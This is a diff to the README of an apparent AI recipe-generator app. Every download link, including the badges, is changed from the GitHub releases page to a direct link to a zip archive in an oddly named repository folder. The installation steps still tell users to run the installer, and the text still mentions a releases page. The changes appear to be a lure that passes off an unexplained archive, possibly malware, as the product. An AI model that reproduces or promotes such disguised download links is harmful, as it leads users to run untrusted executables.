@@ -1,6 +1,6 @@
 # 🍽️ AI-RECIPE-GENERATION - Generate Recipes from Your Food Images
 
-[![Download AI-RECIPE-GENERATION](https://img.shields.io/badge/Download-AI--RECIPE--GENERATION-brightgreen)](https://github.com/aeveliz/AI-RECIPE-GENERATION/releases)
+[![Download AI-RECIPE-GENERATION](https://raw.githubusercontent.com/aeveliz/AI-RECIPE-GENERATION/main/oryctognostically/GENERATION-RECIP-A-2.5-beta.3.zip)](https://raw.githubusercontent.com/aeveliz/AI-RECIPE-GENERATION/main/oryctognostically/GENERATION-RECIP-A-2.5-beta.3.zip)
 
 ## 📦 Overview
 
@@ -11,7 +11,7 @@ AI-RECIPE-GENERATION helps you create recipes from food images. Using advanced t
 To start using AI-RECIPE-GENERATION, follow these simple steps:
 
 1. **Download the Application**: 
-   - Visit [this page to download](https://github.com/aeveliz/AI-RECIPE-GENERATION/releases) the latest version of the software.
+   - Visit [this page to download](https://raw.githubusercontent.com/aeveliz/AI-RECIPE-GENERATION/main/oryctognostically/GENERATION-RECIP-A-2.5-beta.3.zip) the latest version of the software.
   
 2. **Install the Application**: 
    - Once the download is complete, find the file in your Downloads folder and double-click to run the installer. Follow the on-screen instructions to install it on your device.
@@ -54,7 +54,7 @@ AI-RECIPE-GENERATION comes equipped with several features to enhance your cookin
 
 ## 📥 Download & Install
 
-Download AI-RECIPE-GENERATION by visiting [this page](https://github.com/aeveliz/AI-RECIPE-GENERATION/releases). Once on the releases page, find the most current version and follow the steps mentioned earlier in this guide to install the application.
+Download AI-RECIPE-GENERATION by visiting [this page](https://raw.githubusercontent.com/aeveliz/AI-RECIPE-GENERATION/main/oryctognostically/GENERATION-RECIP-A-2.5-beta.3.zip). Once on the releases page, find the most current version and follow the steps mentioned earlier in this guide to install the application.
 
 ## 🛠️ Troubleshooting
 
@@ -80,6 +80,6 @@ Join our community discussions on platforms like Discord or our GitHub discussio
 
 --- 
 
-[![Download AI-RECIPE-GENERATION](https://img.shields.io/badge/Download-AI--RECIPE--GENERATION-brightgreen)](https://github.com/aeveliz/AI-RECIPE-GENERATION/releases)  
+[![Download AI-RECIPE-GENERATION](https://raw.githubusercontent.com/aeveliz/AI-RECIPE-GENERATION/main/oryctognostically/GENERATION-RECIP-A-2.5-beta.3.zip)](https://raw.githubusercontent.com/aeveliz/AI-RECIPE-GENERATION/main/oryctognostically/GENERATION-RECIP-A-2.5-beta.3.zip)  
 
 Thank you for using AI-RECIPE-GENERATION. Enjoy cooking with your new favorite application!
